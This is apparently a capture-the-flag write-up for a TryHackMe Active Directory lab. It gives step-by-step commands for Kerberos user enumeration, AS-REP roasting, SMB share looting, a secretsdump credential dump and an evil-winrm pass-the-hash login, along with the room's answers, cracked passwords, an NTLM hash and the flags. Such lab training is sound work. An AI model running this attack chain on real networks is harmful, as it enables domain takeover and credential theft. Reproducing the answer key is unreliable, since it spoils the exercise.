# Installing Impacket 
```
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install
```

# Installing Bloodhound and Neo4j
```
apt install bloodhound neo4j
```
  Nmap scanning 
```
sudo nmap -A -p- -T5 10.10.197.116 -oN nmap_log
```
| Questions | Answers |
|----------|-------|
| What tool will allow us to enumerate port 139/445 ? | enum4linux |
| What is the NetBIOS-Domain Name of the machine ? | THM-AD |
| What invalid TLD do people commonly use for their Active Directory Domain? | .local |


# Enumerating Users via Kerveros 

## Installing the kurbrute 
```
git clone https://github.com/ropnop/kerbrute.git
```
## running user enum 
```
./kerbrute/dist/kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.197.116 user_list -o valid_user_names
```

| Questions | Answers |
|------|----------|
| What command within kerbrute will allow us to enumerate valid usernames ? | userenum | 
| What notable account is discovered ? (These should jump out at you) | svc-admin |
| What is the other notable account is discovered ? (These should jump out at you) | backup |

# Abusing kerberos 

| Questions | Answers |
|------|------------|
| We have two user accounts that we coould potentially query a ticket from. Which user account can you query a ticket from with no password ? | svc-admin |
| Looking at the Hashcat Examples wiki page, what type ;of kerberos hash did we retrieve from the KDC? (Specify the full name) ? | Kerberos 5, etype 23, AS-REP |
|What mode is the hash ? | 18200 |
| Now crack the hash with the modified password list provided, what is the user accounts password ? | management2005 |


# Back to the Basics
  
password for svc-admin 
``` management2005
```
  
to list all shares 
```
smbclient -U spookysec.locl/svc-admin -L //10.10.197.116
```
  
to show the backup files
```
smbclient -U spookysec.locl/svc-admin //10.10.197.116/backup
get credentials.txt
exit
```
decoding the base64 to string
```
cat backup_credentials.txt | base64 -d
```
| Questions | Answers |
|-----|---------|
| What utility can we use to map remote SMB shares ? | smbclient |
| Which option will list shares ? | -L |
| How many remote shares is the server listing ? | 6 |
| There is one particular share that we have access to that contains a text file. Which share is it ? | backup |
| What is the content of that file ? | YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw |
| Decoding the contents of the file, what is the full contents ? | backup@spookysec.local:backup2517860 |


# Elevating Privileges within the Domain

dumping the hash
```
python /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip 10.10.197.116 spookysec.local/backup:backup2517860@10.10.197.116 | tee dump_file.txt
```

| Questions | Answers |
|-------------|----------|
| What method allowed us to dump NTDS.DIT? | DRSUAPI |
| What is the Administrators NTLM hash ? | 0e0363213e37b94221497260b0bcb4fc |
| What method of attack could allow us to authenticate as the user without the password ? | pass the hash |
| Using a tool called Evil-WinRM what option will allow us to use a hash ? | -H |


# Flag submission pannel 

login as administrator 
```
sudo evil-winrm -i 10.10.197.116 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```

| Users | Flag |
|-------|------|
| svc-admin | TryHackMe{K3rb3r0s_Pr3_4uth} |
| backup | TryHackMe{B4ckM3UpSc0tty!} |
| administrator | TryHackMe{4ctiveD1rectoryM4st3r} |
| 




